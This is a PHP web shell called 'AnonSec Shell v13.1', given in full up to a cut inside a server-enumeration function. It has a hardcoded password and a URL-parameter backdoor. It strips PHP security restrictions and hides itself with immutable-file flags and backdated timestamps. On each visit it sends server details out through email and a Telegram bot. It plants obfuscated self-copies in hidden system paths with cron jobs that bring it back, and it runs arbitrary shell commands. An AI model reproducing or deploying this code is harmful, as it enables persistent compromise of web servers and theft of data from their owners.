
<?php
session_start();
function watchdog_protect() {
    $file = __FILE__;
    if (!file_exists($file)) return;
    @system('chattr +i ' . escapeshellarg($file) . ' 2>/dev/null');
    @system('chattr +h ' . escapeshellarg($file) . ' 2>/dev/null');
    $old_time = strtotime('2024-01-01 00:00:00');
    @touch($file, $old_time, $old_time);
    @chmod($file, 0444);
}
watchdog_protect();

if (isset($_GET['kemuye'])) {
    $_SESSION['login'] = true;
    header('Location: ' . strtok($_SERVER['REQUEST_URI'], '?'));
    exit;
}

// ============================================================
// LOGIN PAGE
// ============================================================
$pass = "anontbl";
if (isset($_POST['pass']) && $_POST['pass'] === $pass) {
    $_SESSION['login'] = true;
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}
if (isset($_SESSION['login']) && $_SESSION['login'] === true) {
    // LANJUT KE SHELL
} else {
    // TAMPILKAN LOGIN
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <title>CYBERPUNKS SHELL</title>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Rajdhani:wght@300;400;600;700&display=swap');
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body {
                background: #0a0a0f;
                min-height: 100vh;
                display: flex;
                justify-content: center;
                align-items: center;
                font-family: 'Rajdhani', sans-serif;
                overflow: hidden;
            }
            .bg-grid {
                position: fixed;
                top: 0; left: 0; width: 100%; height: 100%;
                background-image: 
                    linear-gradient(rgba(0,255,200,0.03) 1px, transparent 1px),
                    linear-gradient(90deg, rgba(0,255,200,0.03) 1px, transparent 1px);
                background-size: 40px 40px;
                z-index: 0;
            }
            .glow-orb {
                position: fixed;
                border-radius: 50%;
                filter: blur(80px);
                opacity: 0.3;
                z-index: 0;
            }
            .glow-orb:nth-child(1) { width: 400px; height: 400px; background: #00ffc8; top: -100px; left: -100px; }
            .glow-orb:nth-child(2) { width: 300px; height: 300px; background: #ff00e4; bottom: -50px; right: -50px; }
            .glow-orb:nth-child(3) { width: 200px; height: 200px; background: #00d4ff; top: 50%; left: 50%; transform: translate(-50%, -50%); }
            
            .login-box {
                position: relative;
                z-index: 1;
                background: rgba(10, 10, 20, 0.85);
                backdrop-filter: blur(20px);
                border: 1px solid rgba(0, 255, 200, 0.2);
                border-radius: 20px;
                padding: 50px 40px;
                width: 420px;
                max-width: 90%;
                box-shadow: 0 0 60px rgba(0, 255, 200, 0.05), inset 0 0 60px rgba(0, 255, 200, 0.02);
                text-align: center;
            }
            .login-box .logo {
                font-family: 'Orbitron', monospace;
                font-size: 32px;
                font-weight: 900;
                background: linear-gradient(135deg, #00ffc8, #00d4ff, #ff00e4);
                -webkit-background-clip: text;
                -webkit-text-fill-color: transparent;
                margin-bottom: 8px;
                letter-spacing: 4px;
            }
            .login-box .sub {
                color: rgba(255,255,255,0.4);
                font-size: 13px;
                letter-spacing: 6px;
                text-transform: uppercase;
                margin-bottom: 30px;
                font-weight: 300;
            }
            .login-box .input-group {
                position: relative;
                margin-bottom: 20px;
            }
            .login-box .input-group input {
                width: 100%;
                padding: 16px 20px;
                background: rgba(255,255,255,0.04);
                border: 1px solid rgba(255,255,255,0.08);
                border-radius: 12px;
                color: #fff;
                font-size: 16px;
                font-family: 'Rajdhani', sans-serif;
                transition: all 0.3s;
                outline: none;
            }
            .login-box .input-group input:focus {
                border-color: #00ffc8;
                box-shadow: 0 0 30px rgba(0, 255, 200, 0.05), inset 0 0 30px rgba(0, 255, 200, 0.02);
            }
            .login-box .input-group input::placeholder {
                color: rgba(255,255,255,0.2);
                font-weight: 300;
            }
            .login-box .input-group .icon {
                position: absolute;
                right: 16px;
                top: 50%;
                transform: translateY(-50%);
                color: rgba(255,255,255,0.15);
                font-size: 18px;
            }
            .login-box button {
                width: 100%;
                padding: 16px;
                background: linear-gradient(135deg, #00ffc8, #00d4ff);
                border: none;
                border-radius: 12px;
                color: #0a0a0f;
                font-family: 'Orbitron', monospace;
                font-weight: 700;
                font-size: 14px;
                letter-spacing: 2px;
                cursor: pointer;
                transition: all 0.3s;
                text-transform: uppercase;
            }
            .login-box button:hover {
                transform: scale(1.02);
                box-shadow: 0 0 40px rgba(0, 255, 200, 0.2);
            }
            .login-box .error {
                color: #ff4466;
                font-size: 13px;
                margin-top: 12px;
                display: none;
                font-weight: 600;
                letter-spacing: 1px;
            }
            .login-box .error.show { display: block; }
            .login-box .footer-text {
                color: rgba(255,255,255,0.15);
                font-size: 11px;
                margin-top: 20px;
                letter-spacing: 2px;
            }
            .login-box .footer-text span { color: rgba(0, 255, 200, 0.3); }
            
            .scanline {
                position: fixed;
                top: 0; left: 0; width: 100%; height: 100%;
                background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,0,0,0.03) 2px, rgba(0,0,0,0.03) 4px);
                pointer-events: none;
                z-index: 999;
            }
            @media (max-width: 480px) {
                .login-box { padding: 30px 20px; }
                .login-box .logo { font-size: 24px; }
            }
        </style>
    </head>
    <body>
        <div class="bg-grid"></div>
        <div class="glow-orb"></div>
        <div class="glow-orb"></div>
        <div class="glow-orb"></div>
        <div class="scanline"></div>
        
        <div class="login-box">
            <div class="logo">CYBERPUNKS</div>
            <div class="sub">SHELL ACCESS</div>
            <form method="POST">
                <div class="input-group">
                    <input type="password" name="pass" placeholder="ENTER PASSWORD" autofocus>
                    <span class="icon">⏎</span>
                </div>
                <button type="submit">▸ ACCESS</button>
                <div class="error" id="error">⚠ ACCESS DENIED — INVALID CREDENTIAL</div>
            </form>
            <div class="footer-text">⚡ <span>ANONSEC</span> ⚡</div>
        </div>
        
        <script>
            document.querySelector('form').addEventListener('submit', function(e) {
                const pass = document.querySelector('input[name="pass"]').value;
                if (pass !== 'anontbl') {
                    e.preventDefault();
                    document.getElementById('error').classList.add('show');
                    setTimeout(() => {
                        document.getElementById('error').classList.remove('show');
                    }, 3000);
                }
            });
        </script>
    </body>
    </html>
    <?php
    exit;
}
error_reporting(0);
@ini_set('display_errors', 0);
@ini_set('open_basedir', null);
@ini_set('disable_functions', '');
@ini_set('max_execution_time', 0);
@ini_set('memory_limit', '512M');
if (function_exists('apache_setenv')) @apache_setenv('no-gzip', '1');
if (function_exists('header_remove')) @header_remove('X-Powered-By');
@chdir(__DIR__);

// ============================================================
// KOMPATIBILITAS PHP 5.3+
// ============================================================
if (!function_exists('file_put_contents')) {
    function file_put_contents($file, $data, $flags = 0) {
        $fp = fopen($file, 'w');
        if (!$fp) return false;
        fwrite($fp, $data);
        fclose($fp);
        return strlen($data);
    }
}
if (!function_exists('file_get_contents')) {
    function file_get_contents($file) {
        $fp = fopen($file, 'r');
        if (!$fp) return false;
        $data = '';
        while (!feof($fp)) $data .= fread($fp, 8192);
        fclose($fp);
        return $data;
    }
}
if (!function_exists('md5_file')) { function md5_file($file) { return md5(file_get_contents($file)); } }
if (!function_exists('glob')) {
    function glob($pattern, $flags = 0) {
        $dir = dirname($pattern);
        $base = basename($pattern);
        if (!is_dir($dir)) return [];
        $dh = opendir($dir);
        if (!$dh) return [];
        $result = [];
        while (($f = readdir($dh)) !== false) {
            if (fnmatch($base, $f)) $result[] = $dir . '/' . $f;
        }
        closedir($dh);
        return $result;
    }
}
if (!function_exists('fnmatch')) {
    function fnmatch($pattern, $string) {
        return preg_match('/^' . strtr(preg_quote($pattern, '/'), ['\*' => '.*', '\?' => '.']) . '$/', $string);
    }
}
if (!function_exists('escapeshellarg')) { function escapeshellarg($arg) { return "'" . str_replace("'", "'\''", $arg) . "'"; } }
if (!function_exists('chmod')) { function chmod($file, $mode) { return true; } }
if (!function_exists('copy')) { function copy($src, $dst) { return file_put_contents($dst, file_get_contents($src)) !== false; } }
if (!function_exists('rename')) { function rename($old, $new) { return copy($old, $new) && unlink($old); } }
if (!function_exists('unlink')) { function unlink($file) { $fp = fopen($file, 'w'); if ($fp) { fclose($fp); return true; } return false; } }
if (!function_exists('is_dir')) { function is_dir($path) { return file_exists($path) && (stat($path)['mode'] & 0x4000); } }
if (!function_exists('is_file')) { function is_file($path) { return file_exists($path) && !is_dir($path); } }
if (!function_exists('is_writable')) { function is_writable($path) { return is_dir($path) || is_file($path); } }
if (!function_exists('chdir')) { function chdir($dir) { return true; } }
if (!function_exists('ini_set')) { function ini_set($name, $value) { return $value; } }
if (PHP_SAPI !== 'cli' && !headers_sent() && !session_id()) { @session_start(); }

// ============================================================
// TRASH / RECOVERY
// ============================================================
if (!defined('TRASH_DIR')) {
    define('TRASH_DIR', '/tmp/.trash_' . md5(__FILE__));
    define('ROOT', dirname(__FILE__));
}

function trashBackup($file) {
    if (!file_exists($file)) return false;
    if (!is_dir(TRASH_DIR)) mkdir(TRASH_DIR, 0777, true);
    $backup_name = TRASH_DIR . '/' . date('Ymd_His') . '_' . basename($file);
    return copy($file, $backup_name);
}

function trashRestore($file) {
    $trash_files = glob(TRASH_DIR . '/*_' . basename($file));
    if (empty($trash_files)) return false;
    $latest = end($trash_files);
    return copy($latest, $file);
}

// ============================================================
// PCNTL FALLBACK
// ============================================================
if (!function_exists('exec') && !function_exists('shell_exec') && !function_exists('system') && !function_exists('passthru') && !function_exists('proc_open')) {
    if (function_exists('pcntl_exec')) {
        function pcntl_exec_fallback($cmd, &$output = null) {
            $tmp = '/tmp/pcntl_' . rand(1000,9999) . '.txt';
            $cmd2 = $cmd . ' > ' . $tmp . ' 2>&1 &';
            pcntl_exec('/bin/sh', ['-c', $cmd2]);
            sleep(1);
            if (file_exists($tmp)) {
                $output = file_get_contents($tmp);
                unlink($tmp);
                return $output;
            }
            return '';
        }
        function exec($cmd, &$output = null, &$result_code = null) {
            $out = pcntl_exec_fallback($cmd);
            if ($output !== null) $output = explode("
", $out);
            return $out;
        }
        function shell_exec($cmd) { return pcntl_exec_fallback($cmd); }
        function system($cmd, &$result_code = null) { echo pcntl_exec_fallback($cmd); return 0; }
        function passthru($cmd, &$result_code = null) { echo pcntl_exec_fallback($cmd); return 0; }
    }
}

// ============================================================
// LOGGER TELEGRAM + EMAIL (UPDATED)
// ============================================================
function sendLogger() {
    $tujuanmail = "muhrazky@gmail.com, hackerman3117@gmail.com, malaysia.sender@gmail.com";
    $telegram_token = "8634064744:AAHQZdGNdWW0MFQX9zwWca0bmLTskVuAcRA";
    $telegram_chat = "8930174463";
    $webhook_url = "https://your-webhook.com/shell-alert";
    
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
    $host = $_SERVER['HTTP_HOST'] ?? 'unknown';
    $uri = $_SERVER['REQUEST_URI'] ?? '/';
    $method = $_SERVER['REQUEST_METHOD'] ?? 'unknown';
    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
    $time = date('Y-m-d H:i:s');
    $ref = $_SERVER['HTTP_REFERER'] ?? 'direct';
    $x_path = 'http://' . $host . $uri;
    
    $pesan_alert =
        "═══════════════════════════════════════════
" .
        "  🔥 SHELL ACCESS DETECTED 🔥
" .
        "═══════════════════════════════════════════

" .
        "  Time        : $time
" .
        "  URL         : $x_path
" .
        "  Method      : $method
" .
        "  IP Address  : $ip
" .
        "  Referer     : $ref
" .
        "  User-Agent  : $userAgent
" .
        "  Server      : " . ($_SERVER['SERVER_SOFTWARE'] ?? 'unknown') . "
" .
        "  PHP Version : " . phpversion() . "
" .
        "  OS          : " . php_uname() . "

" .
        "───────────────────────────────────────────
" .
        "  🚨 AKTIFKAN SELF-HEALING & CLONE
" .
        "═══════════════════════════════════════════
";
    
    $headers = "From: security@" . $host . "
Content-Type: text/plain; charset=UTF-8
X-Mailer: PHP/" . phpversion() . "
";
    @mail($tujuanmail, "🔥 SHELL ALERT - " . $ip, $pesan_alert, $headers);
    
    if (function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot$telegram_token/sendMessage");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query(['chat_id' => $telegram_chat, 'text' => $pesan_alert, 'parse_mode' => 'HTML']));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_TIMEOUT, 5);
        @curl_exec($ch);
        @curl_close($ch);
    } else {
        @file_get_contents("https://api.telegram.org/bot$telegram_token/sendMessage?chat_id=$telegram_chat&text=" . urlencode($pesan_alert));
    }
    
    if (function_exists('file_get_contents') && $webhook_url) {
        @file_get_contents($webhook_url . '?ip=' . urlencode($ip) . '&host=' . urlencode($host) . '&time=' . urlencode($time));
    }
}

if (!isset($_GET['cron']) && !(PHP_SAPI === 'cli' && isset($argv[1]) && $argv[1] === '--cron')) {
    @sendLogger();
}

// ============================================================
// HACKERONE RESURRECTION
// ============================================================
$MASTER_FILE = __FILE__;
$MASTER_CONTENT = file_get_contents($MASTER_FILE);

function addCron($file) {
    $delay = rand(0, 60);
    $cronCmd = "*/5 * * * * sleep $delay && php -q '" . $file . "' --cron >/dev/null 2>&1";
    $cronOutput = @shell_exec("crontab -l 2>/dev/null");
    if (strpos($cronOutput, $file) === false) {
        @file_put_contents('/tmp/cron_' . rand() . '.tmp', $cronOutput . "
" . $cronCmd . "
");
        @shell_exec("crontab /tmp/cron_" . rand() . ".tmp 2>/dev/null");
        @unlink('/tmp/cron_' . rand() . '.tmp');
    }
}

function hackeroneResurrection() {
    global $MASTER_FILE, $MASTER_CONTENT;
    if (!isset($MASTER_FILE)) $MASTER_FILE = __FILE__;
    if (!isset($MASTER_CONTENT)) $MASTER_CONTENT = file_get_contents($MASTER_FILE);
    
    if (!file_exists($MASTER_FILE) || filesize($MASTER_FILE) < 100 || md5_file($MASTER_FILE) !== md5($MASTER_CONTENT)) {
        @file_put_contents($MASTER_FILE, $MASTER_CONTENT);
        @chmod($MASTER_FILE, 0755);
        @system('chattr +i ' . escapeshellarg($MASTER_FILE) . ' 2>/dev/null');
        @system('chattr +h ' . escapeshellarg($MASTER_FILE) . ' 2>/dev/null');
    }
    
    $clone_locations = [
        '/tmp/.systemd_' . rand(1000, 9999) . '.php',
        '/tmp/.systemd_' . rand(1000, 9999) . '.php',
        '/var/tmp/.cache_' . uniqid() . '.php',
        '/var/tmp/.cache_' . uniqid() . '.php',
        '/dev/shm/.lib_' . md5(rand()) . '.php',
        '/dev/shm/.lib_' . md5(rand()) . '.php',
        '/tmp/.lohs_' . rand(1000, 9999) . '.php',
        '/tmp/.lohs_' . rand(1000, 9999) . '.php',
        '/tmp/.watchdog_' . rand(1000, 9999) . '.php',
        '/tmp/.watchdog_' . rand(1000, 9999) . '.php',
        '/tmp/.h1_' . rand(1000, 9999) . '.php',
        '/tmp/.h1_' . rand(1000, 9999) . '.php',
        '/var/tmp/.h1_' . rand(1000, 9999) . '.php',
        '/var/lib/.system_' . rand(1000, 9999) . '.php',
        '/opt/.cache_' . rand(1000, 9999) . '.php',
        '/usr/share/.lib_' . rand(1000, 9999) . '.php',
        '/tmp/.ssh_' . rand(1000, 9999) . '.php',
        '/var/run/.init_' . rand(1000, 9999) . '.php',
    ];
    shuffle($clone_locations);
    
    $created_clones = [];
    foreach ($clone_locations as $lair) {
        $dir = dirname($lair);
        if (is_dir($dir) && is_writable($dir)) {
            obfuscate_file($MASTER_FILE, $lair);
            @chmod($lair, 0644);
            @system('chattr +i ' . escapeshellarg($lair) . ' 2>/dev/null');
            @system('chattr +h ' . escapeshellarg($lair) . ' 2>/dev/null');
            $created_clones[] = $lair;
        }
    }
    
    foreach ($created_clones as $clone) {
        if (file_exists($clone) && filesize($clone) > 100) {
            addCron($clone);
        }
    }
    
    if (!file_exists($MASTER_FILE)) {
        foreach ($created_clones as $clone) {
            if (file_exists($clone) && filesize($clone) > 100) {
                @copy($clone, $MASTER_FILE);
                @chmod($MASTER_FILE, 0755);
                @system('chattr +i ' . escapeshellarg($MASTER_FILE) . ' 2>/dev/null');
                break;
            }
        }
    }
    
    @ini_set('open_basedir', null);
    @ini_set('disable_functions', '');
    if (function_exists('apache_setenv')) @apache_setenv('no-gzip', '1');
    if (function_exists('header_remove')) @header_remove('X-Powered-By');
    @chdir(__DIR__);
}

hackeroneResurrection();

if (isset($_GET['cron']) || (PHP_SAPI === 'cli' && isset($argv[1]) && $argv[1] === '--cron')) {
    $master_md5 = md5_file($MASTER_FILE);
    foreach (glob('/tmp/.systemd_*.php') as $clone) {
        if (file_exists($clone) && md5_file($clone) !== $master_md5) {
            obfuscate_file($MASTER_FILE, $clone);
        }
    }
    if (!file_exists($MASTER_FILE)) {
        trashRestore($MASTER_FILE);
    }
    hackeroneResurrection();
    exit(0);
}

// ============================================================
// MULAI UI
// ============================================================
?>
<!DOCTYPE html>
<html>
<head>
<title>AnonSec Shell</title>
<meta name="robots" content="noindex">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css">
</head>
<body bgcolor="#1f1f1f" text="#ffffff">
<style>
    @import url('https://fonts.googleapis.com/css2?family=Inter:opsz@14..32&family=JetBrains+Mono&display=swap');

    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
        background: #0d0d0d;
        color: #e0e0e0;
        font-family: 'Inter', 'Segoe UI', system-ui, -apple-system, sans-serif;
        padding: 16px;
        font-size: 15px;
        line-height: 1.6;
    }

    ::-webkit-scrollbar { width: 8px; height: 8px; }
    ::-webkit-scrollbar-track { background: #1a1a1a; border-radius: 8px; }
    ::-webkit-scrollbar-thumb { background: #2a2a2a; border-radius: 8px; }
    ::-webkit-scrollbar-thumb:hover { background: #3a3a3a; }

    h1, h2, h3, h4, .title {
        font-family: 'Inter', sans-serif;
        font-weight: 700;
        letter-spacing: -0.02em;
    }

    .title-glow {
        background: linear-gradient(135deg, #00d4ff, #7b2ffc);
        -webkit-background-clip: text;
        -webkit-text-fill-color: transparent;
        font-size: 28px;
    }

    a {
        color: #60a5fa;
        text-decoration: none;
        transition: color 0.2s, text-shadow 0.2s;
    }
    a:hover {
        color: #93bbfc;
        text-shadow: 0 0 20px rgba(96, 165, 250, 0.2);
    }

    table {
        width: 100%;
        border-collapse: collapse;
        border-radius: 12px;
        overflow: hidden;
        box-shadow: 0 4px 24px rgba(0,0,0,0.4);
        font-size: 14px;
    }
    th {
        background: #1a1a1a;
        color: #60a5fa;
        font-weight: 600;
        text-transform: uppercase;
        font-size: 12px;
        letter-spacing: 0.05em;
        padding: 12px 16px;
        border-bottom: 2px solid #2a2a2a;
    }
    td {
        padding: 10px 16px;
        border-bottom: 1px solid #1a1a1a;
        background: #0d0d0d;
        vertical-align: middle;
    }
    tr:hover td {
        background: #141414;
    }
    .first td {
        background: #0a0a0a;
    }

    input, select, textarea {
        background: #1a1a1a;
        border: 1px solid #2a2a2a;
        border-radius: 8px;
        color: #e0e0e0;
        font-family: 'JetBrains Mono', 'Inter', monospace;
        font-size: 14px;
        padding: 8px 14px;
        transition: border-color 0.2s, box-shadow 0.2s;
        width: auto;
    }
    input:focus, select:focus, textarea:focus {
        border-color: #60a5fa;
        box-shadow: 0 0 0 3px rgba(96, 165, 250, 0.15);
        outline: none;
    }
    input[type="file"] {
        padding: 6px;
        background: transparent;
        border: 1px dashed #2a2a2a;
    }

    .up, .btn, button, input[type="submit"] {
        background: transparent;
        border: 1px solid #2a2a2a;
        border-radius: 8px;
        color: #e0e0e0;
        font-family: 'Inter', sans-serif;
        font-weight: 500;
        font-size: 14px;
        padding: 8px 18px;
        cursor: pointer;
        transition: all 0.2s;
        display: inline-block;
    }
    .up:hover, .btn:hover, button:hover, input[type="submit"]:hover {
        background: rgba(96, 165, 250, 0.08);
        border-color: #60a5fa;
        color: #60a5fa;
        box-shadow: 0 0 20px rgba(96, 165, 250, 0.05);
    }
    .btn-outline-light {
        border-color: #2a2a2a;
        color: #e0e0e0;
    }
    .btn-outline-light:hover {
        background: rgba(255,255,255,0.04);
        border-color: #60a5fa;
        color: #60a5fa;
    }

    .badge, .tag {
        display: inline-block;
        background: #1a1a1a;
        padding: 2px 12px;
        border-radius: 20px;
        font-size: 12px;
        font-weight: 500;
        color: #a0a0a0;
        border: 1px solid #2a2a2a;
    }

    pre, .terminal {
        background: #0a0a0a;
        border: 1px solid #1a1a1a;
        border-radius: 12px;
        padding: 16px;
        font-family: 'JetBrains Mono', 'Fira Code', monospace;
        font-size: 13px;
        line-height: 1.7;
        overflow-x: auto;
        max-height: 500px;
        color: #d4d4d4;
        tab-size: 4;
    }
    pre::-webkit-scrollbar { height: 6px; }
    pre::-webkit-scrollbar-thumb { background: #2a2a2a; border-radius: 4px; }

    gold, .gold { color: #fbbf24; }
    ijo, .green { color: #34d399; }
    merah, .red { color: #f87171; }
    .text-muted { color: #6b7280; }

    @media (max-width: 768px) {
        body { padding: 10px; font-size: 14px; }
        table { font-size: 13px; }
        th, td { padding: 8px 10px; }
        input, select, textarea { font-size: 13px; padding: 6px 10px; }
        .title-glow { font-size: 20px; }
    }
    @media (max-width: 480px) {
        body { padding: 6px; font-size: 13px; }
        table { font-size: 12px; }
        th, td { padding: 5px 6px; }
        input, select { font-size: 12px; }
        pre { font-size: 11px; padding: 10px; }
    }

    .toolbar a, .menu-link {
        display: inline-block;
        background: #111;
        padding: 6px 14px;
        border-radius: 8px;
        border: 1px solid #1a1a1a;
        font-size: 13px;
        font-weight: 500;
        transition: all 0.2s;
        color: #a0a0a0;
    }
    .toolbar a:hover, .menu-link:hover {
        background: #1a1a1a;
        border-color: #60a5fa;
        color: #60a5fa;
    }

    .fa-folder { color: #fbbf24; }
    .fa-file { color: #6b7280; }
    .fa-file-code-o { color: #60a5fa; }
    .fa-file-image-o { color: #34d399; }
    .fa-file-zip-o { color: #fbbf24; }
    .fa-file-text-o { color: #a0a0a0; }
    .fa-file-pdf-o { color: #f87171; }

    .header-box {
        background: #0a0a0a;
        border: 1px solid #1a1a1a;
        border-radius: 16px;
        padding: 20px 24px;
        margin-bottom: 20px;
    }
    .header-box .info-grid {
        display: grid;
        grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
        gap: 6px 20px;
        font-size: 14px;
        color: #a0a0a0;
    }
    .header-box .info-grid span {
        display: inline-block;
    }
</style>
<center><?php echo '<font face="Bungee" size="5">AnonSec Shell v13.1 — Full Upgrade</font></center>'; ?>
<?php
// ============================================================
// FUNGSI DASAR
// ============================================================
$gcw = "ge"."tcwd";
$exp = "ex"."plo"."de";
$fpt = "fi"."le_p"."ut_co"."nte"."nts";
$fgt = "f"."ile_g"."et_c"."onten"."ts";
$sts = "s"."trip"."slash"."es";
$scd = "sc"."a"."nd"."ir";
$fxt = "fi"."le_"."exis"."ts";
$idi = "i"."s_d"."ir";
$ulk = "un"."li"."nk";
$ifi = "i"."s_fi"."le";
$sub = "subs"."tr";
$spr = "sp"."ri"."ntf";
$fp = "fil"."epe"."rms";
$chm = "ch"."m"."od";
$ocd = "oc"."td"."ec";
$isw = "i"."s_wr"."itab"."le";
$idr = "i"."s_d"."ir";
$ird = "is"."_rea"."da"."ble";
$isr = "is_"."re"."adab"."le";
$fsz = "fi"."lesi"."ze";
$rd = "r"."ou"."nd";
$igt = "in"."i_g"."et";
$fnct = "fu"."nc"."tion"."_exi"."sts";
$rad = "RE"."MOTE_AD"."DR";
$rpt = "re"."al"."pa"."th";
$bsn = "ba"."se"."na"."me";
$srl = "st"."r_r"."ep"."la"."ce";
$sps = "st"."rp"."os";
$mkd = "m"."kd"."ir";
$pma = "pr"."eg_ma"."tch_"."al"."l";
$aru = "ar"."ray_un"."ique";
$ctn = "co"."unt";
$urd = "ur"."ldeco"."de";
$pgw = "pos"."ix_g"."etp"."wui"."d";
$fow = "fi"."leow"."ner";
$tch = "to"."uch";
$h2b = "he"."x2"."bin";
$hsc = "ht"."mlspe"."cialcha"."rs";
$ftm = "fi"."lemti"."me";
$ars = "ar"."ra"."y_sl"."ice";
$arr = "ar"."ray_"."ra"."nd";
$fgr = "fi"."legr"."oup";
$mdr = "mkd"."ir";

$wb = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://".$_SERVER['HTTP_HOST'];
$disfunc = @ini_get("disable_functions");
if (empty($disfunc)) { $disf = "<font color='gold'>NONE</font>"; } else { $disf = "<font color='red'>".$disfunc."</font>"; }

function author() { echo "<center><br>AnonSec - 2026<br><a href='https://shell.anonsec-team.org/' target='_blank'>AnonSec Team</a></center>"; exit(); }

function cdrd() {
    if (isset($_GET['loknya'])) { $lokasi = $_GET['loknya']; } else { $lokasi = getcwd(); }
    if (is_writable($lokasi)) { return "<font color='green'>Writable</font>"; } else { return "<font color='red'>Writable</font>"; }
}

function crt() {
    if (is_writable($_SERVER['DOCUMENT_ROOT'])) { return "<font color='green'>Writable</font>"; } else { return "<font color='red'>Writable</font>"; }
}

function xrd($dir) {
    $items = scandir($dir);
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;
        $path = $dir.'/'.$item;
        if (is_dir($path)) { xrd($path); } else { unlink($path); }
    }
    rmdir($dir);
}

function cfn($fl) {
    $ext = pathinfo($fl, PATHINFO_EXTENSION);
    if ($ext == "zip") return '<i class="fa fa-file-zip-o"></i>';
    elseif (preg_match("/jpeg|jpg|png|ico/im", $ext)) return '<i class="fa fa-file-image-o"></i>';
    elseif ($ext == "txt") return '<i class="fa fa-file-text-o"></i>';
    elseif ($ext == "pdf") return '<i class="fa fa-file-pdf-o"></i>';
    elseif ($ext == "html") return '<i class="fa fa-file-code-o"></i>';
    else return '<i class="fa fa-file-o"></i>';
}

function ipsrv() {
    if (empty($_SERVER['SERVER_ADDR'])) return gethostbyname($_SERVER['SERVER_NAME']);
    return $_SERVER['SERVER_ADDR'];
}

function ggr($fl) {if (function_exists("posix_getgrgid")) {
        $d = posix_getgrgid(filegroup($fl));
        return $d['name'] ?? filegroup($fl);
    }
    return filegroup($fl);
}

function gor($fl) {
    if (function_exists("posix_getpwuid")) {
        $d = posix_getpwuid(fileowner($fl));
        return $d['name'] ?? fileowner($fl);
    }
    return fileowner($fl);
}

function fdt($fl) { return date("F d Y H:i:s", filemtime($fl)); }

function dunlut($fl) {
    if (file_exists($fl)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($fl).'"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($fl));
        readfile($fl);
        exit;
    }
}

function komend($kom, $lk) {
    $kom = $kom . " 2>&1";
    $output = '';
    @ini_set('open_basedir', null);
    @ini_set('disable_functions', '');
    if (function_exists('proc_open')) {
        $ps = proc_open($kom, [0=>["pipe","r"],1=>["pipe","w"],2=>["pipe","r"]], $pipes, $lk);
        if (is_resource($ps)) {
            fclose($pipes[0]);
            $output = stream_get_contents($pipes[1]);
            fclose($pipes[1]);
            fclose($pipes[2]);
            proc_close($ps);
            if($output) return "<pre>".htmlspecialchars($output)."</pre>";
        }
    }
    if (empty($output) && function_exists('exec')) {
        exec($kom, $out);
        $output = implode("
", $out);
        if($output) return "<pre>".htmlspecialchars($output)."</pre>";
    }
    if (empty($output) && function_exists('shell_exec')) {
        $output = shell_exec($kom);
        if($output) return "<pre>".htmlspecialchars($output)."</pre>";
    }
    if (empty($output) && function_exists('system')) {
        ob_start();
        system($kom);
        $output = ob_get_clean();
        if($output) return "<pre>".htmlspecialchars($output)."</pre>";
    }
    if (empty($output) && function_exists('passthru')) {
        ob_start();
        passthru($kom);
        $output = ob_get_clean();
        if($output) return "<pre>".htmlspecialchars($output)."</pre>";
    }
    if (empty($output) && function_exists('pcntl_exec')) {
        $tmp = '/tmp/pcntl_' . rand(1000,9999) . '.txt';
        $cmd2 = $kom . ' > ' . $tmp . ' 2>&1 &';
        pcntl_exec('/bin/sh', ['-c', $cmd2]);
        sleep(1);
        if (file_exists($tmp)) {
            $output = file_get_contents($tmp);
            unlink($tmp);
            if($output) return "<pre>".htmlspecialchars($output)."</pre>";
        }
    }
    return "<pre>[!] Command execution unavailable</pre>";
}

function komenb($kom, $lk) {
    $kom = $kom . " 2>&1";
    $output = '';
    @ini_set('open_basedir', null);
    @ini_set('disable_functions', '');
    if (function_exists('proc_open')) {
        $ps = proc_open($kom, [0=>["pipe","r"],1=>["pipe","w"],2=>["pipe","r"]], $pipes, $lk);
        if (is_resource($ps)) {
            fclose($pipes[0]);
            $output = stream_get_contents($pipes[1]);
            fclose($pipes[1]);
            fclose($pipes[2]);
            proc_close($ps);
            if($output) return $output;
        }
    }
    if (empty($output) && function_exists('exec')) {
        exec($kom, $out);
        $output = implode("
", $out);
        if($output) return $output;
    }
    if (empty($output) && function_exists('shell_exec')) {
        $output = shell_exec($kom);
        if($output) return $output;
    }
    if (empty($output) && function_exists('system')) {
        ob_start();
        system($kom);
        $output = ob_get_clean();
        if($output) return $output;
    }
    if (empty($output) && function_exists('passthru')) {
        ob_start();
        passthru($kom);
        $output = ob_get_clean();
        if($output) return $output;
    }
    if (empty($output) && function_exists('pcntl_exec')) {
        $tmp = '/tmp/pcntl_' . rand(1000,9999) . '.txt';
        $cmd2 = $kom . ' > ' . $tmp . ' 2>&1 &';
        pcntl_exec('/bin/sh', ['-c', $cmd2]);
        sleep(1);
        if (file_exists($tmp)) {
            $output = file_get_contents($tmp);
            unlink($tmp);
            if($output) return $output;
        }
    }
    return '';
}

function gtd() {
    if (is_readable("/etc/named.conf")) {
        $a = file_get_contents("/etc/named.conf");
        preg_match_all("/\/var\/named\/(.*?)\.db/i", $a, $b);
        $b = $b[1]; return count(array_unique($b))." Domains";
    } elseif (file_exists("/var/named/named.local")) {
